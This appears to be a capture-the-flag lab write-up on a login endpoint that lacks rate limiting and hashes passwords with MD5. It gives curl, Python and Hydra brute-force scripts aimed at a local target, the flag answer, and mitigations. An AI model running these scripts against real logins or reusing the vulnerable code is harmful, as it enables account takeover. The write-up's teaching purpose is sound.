# Brute Force Attack - No Rate Limiting

## Overview

This vulnerability demonstrates a critical security flaw where the login endpoint lacks rate limiting protection. Without rate limiting, attackers can perform unlimited login attempts, enabling brute force attacks to crack user passwords. Combined with weak password practices and leaked email addresses, this creates a serious authentication bypass vulnerability.

## Vulnerability Summary

The application's login endpoint (`/api/auth/login`) allows unlimited authentication attempts without any:

1. **Rate limiting**: No restriction on the number of requests per time period
2. **Account lockout**: No temporary or permanent account lockout after failed attempts
3. **CAPTCHA**: No human verification to prevent automated attacks
4. **Exponential backoff**: No increasing delays between failed attempts

### Vulnerable Code

```typescript
// /app/api/auth/login/route.ts
export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, password } = body;

    // No rate limiting check here!
    // Attackers can make unlimited requests

    const hashedPassword = hashMD5(password);
    const user = await prisma.user.findUnique({
      where: { email },
    });

    if (!user || user.password !== hashedPassword) {
      return NextResponse.json(
        { error: "Invalid credentials" },
        { status: 401 }
      );
    }

    // ... authentication proceeds
  }
}
```

## Impact

This vulnerability allows attackers to:

- **Brute force passwords**: Test thousands of password combinations per second
- **Credential stuffing**: Test known leaked credentials against all accounts
- **Dictionary attacks**: Try common passwords from wordlists like rockyou.txt
- **Account takeover**: Gain unauthorized access to user accounts
- **Enumerate valid accounts**: Different error messages reveal if an email exists

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{brut3_f0rc3_n0_r4t3_l1m1t}`, you need to:

1. Discover the target email from the News page data breach
2. Brute force the password using a common wordlist
3. Successfully log in as Vis Bruta

### Step 1: Reconnaissance

Visit the News page (`/news`) and examine the "Leaked Data Sample" section. You will find:

- `alice@example.com` - with MD5 hash
- `bob@example.com` - with MD5 hash
- `vis.bruta@example.com` - **email only, no hash**

### Step 2: Brute Force Attack

Since `vis.bruta@example.com` has no leaked hash, you must brute force the password.

**Using curl in a bash loop:**

```bash
# Download rockyou wordlist if needed
# https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Brute force with top passwords
while read password; do
  response=$(curl -s -X POST http://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"vis.bruta@example.com\",\"password\":\"$password\"}")

  if echo "$response" | grep -q "token"; then
    echo "Password found: $password"
    echo "Response: $response"
    break
  fi
done < rockyou.txt
```

**Using Python:**

```python
import requests

url = "http://localhost:3000/api/auth/login"
email = "vis.bruta@example.com"

with open("rockyou.txt", "r", encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        response = requests.post(url, json={
            "email": email,
            "password": password
        })

        if response.status_code == 200:
            data = response.json()
            if "token" in data:
                print(f"Password found: {password}")
                print(f"Flag: {data.get('flag')}")
                break
```

**Using Hydra:**

```bash
hydra -l vis.bruta@example.com -P rockyou.txt \
  localhost http-post-form \
  "/api/auth/login:email=^USER^&password=^PASS^:Invalid"
```

### Step 3: Retrieve the Flag

Once you find the correct password and log in successfully:

1. Navigate to the login page (`/login`)
2. Enter the credentials for Vis Bruta
3. A flag toast will appear showing `OSS{brut3_f0rc3_n0_r4t3_l1m1t}`

Alternatively, the flag is returned directly in the API response when logging in as Vis Bruta.

### Why This Works

- **No rate limiting**: The server processes every request without any throttling
- **Weak password**: The user chose a password from the rockyou wordlist
- **MD5 is fast**: Even if hashing was checked server-side, MD5 is computationally cheap
- **Email enumeration**: The leaked data provides valid target emails

## Mitigation

### Implement Rate Limiting

```typescript
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { error: "Too many login attempts. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to login route
app.post("/api/auth/login", loginLimiter, loginHandler);
```

### Account Lockout

```typescript
const MAX_FAILED_ATTEMPTS = 5;
const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes

if (user.failedLoginAttempts >= MAX_FAILED_ATTEMPTS) {
  const lockoutEnd = new Date(
    user.lastFailedLogin.getTime() + LOCKOUT_DURATION
  );
  if (new Date() < lockoutEnd) {
    return NextResponse.json(
      { error: "Account temporarily locked. Try again later." },
      { status: 429 }
    );
  }
}
```

### Additional Protections

1. **CAPTCHA**: Add reCAPTCHA after 3 failed attempts
2. **Strong password policy**: Require complex passwords
3. **Use bcrypt**: Replace MD5 with bcrypt (slower, more secure)
4. **MFA**: Implement multi-factor authentication
5. **Monitoring**: Alert on unusual login patterns

## References

- [OWASP Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [OWASP Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
